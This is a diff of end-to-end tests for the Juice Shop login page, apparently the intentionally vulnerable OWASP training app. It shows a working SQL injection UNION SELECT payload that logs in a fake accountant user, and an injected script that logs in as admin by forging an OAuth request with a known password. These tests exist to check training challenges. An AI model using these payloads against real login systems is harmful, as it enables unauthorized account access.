@@ -10,7 +10,7 @@ describe('/#/login', () => {
   let email, password, rememberMeCheckbox, loginButton
 
   beforeEach(() => {
-    browser.get('/#/login')
+    browser.get(protractor.basePath + '/#/login')
     email = element(by.id('email'))
     password = element(by.id('password'))
     rememberMeCheckbox = element(by.id('rememberMe-input'))
@@ -147,7 +147,19 @@ describe('/#/login', () => {
       rememberMeCheckbox.click()
       loginButton.click()
 
-      browser.executeScript('var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 200) { console.log("Success"); }}; xhttp.open("POST","http://localhost:3000/rest/user/login", true); xhttp.setRequestHeader("Content-type","application/json"); xhttp.setRequestHeader("Authorization",`Bearer ${localStorage.getItem("token")}`); xhttp.setRequestHeader("X-User-Email", localStorage.getItem("email")); xhttp.send(JSON.stringify({email: "admin@juice-sh.op", password: "admin123", oauth: true}));') // eslint-disable-line
+      browser.executeScript(baseUrl => {
+        var xhttp = new XMLHttpRequest()
+        xhttp.onreadystatechange = function () {
+          if (this.status === 200) {
+            console.log('Success')
+          }
+        }
+        xhttp.open('POST', baseUrl + '/rest/user/login', true)
+        xhttp.setRequestHeader('Content-type', 'application/json')
+        xhttp.setRequestHeader('Authorization', `Bearer ${localStorage.getItem('token')}`)
+        xhttp.setRequestHeader('X-User-Email', localStorage.getItem('email'))
+        xhttp.send(JSON.stringify({ email: 'admin@juice-sh.op', password: 'admin123', oauth: true }))
+      }, browser.baseUrl)
 
       // Deselect to clear email field for subsequent tests
       rememberMeCheckbox.click()
@@ -175,7 +187,7 @@ describe('/#/login', () => {
 
   describe('challenge "ephemeralAccountant"', () => {
     it('should log in non-existing accountant user with SQLI attack on email field using UNION SELECT payload', () => {
-      email.sendKeys('\' UNION SELECT * FROM (SELECT 15 as \'id\', \'\' as \'username\', \'acc0unt4nt@juice-sh.op\' as \'email\', \'12345\' as \'password\', \'accounting\' as \'role\', \'1.2.3.4\' as \'lastLoginIp\' , \'default.svg\' as \'profileImage\', \'\' as \'totpSecret\', 1 as \'isActive\', \'1999-08-16 14:14:41.644 +00:00\' as \'createdAt\', \'1999-08-16 14:33:41.930 +00:00\' as \'updatedAt\', null as \'deletedAt\')--')
+      email.sendKeys('\' UNION SELECT * FROM (SELECT 15 as \'id\', \'\' as \'username\', \'acc0unt4nt@juice-sh.op\' as \'email\', \'12345\' as \'password\', \'accounting\' as \'role\', \'123\' as \'deluxeToken\', \'1.2.3.4\' as \'lastLoginIp\' , \'/assets/public/images/uploads/default.svg\' as \'profileImage\', \'\' as \'totpSecret\', 1 as \'isActive\', \'1999-08-16 14:14:41.644 +00:00\' as \'createdAt\', \'1999-08-16 14:33:41.930 +00:00\' as \'updatedAt\', null as \'deletedAt\')--')
       password.sendKeys('a')
       loginButton.click()
     })
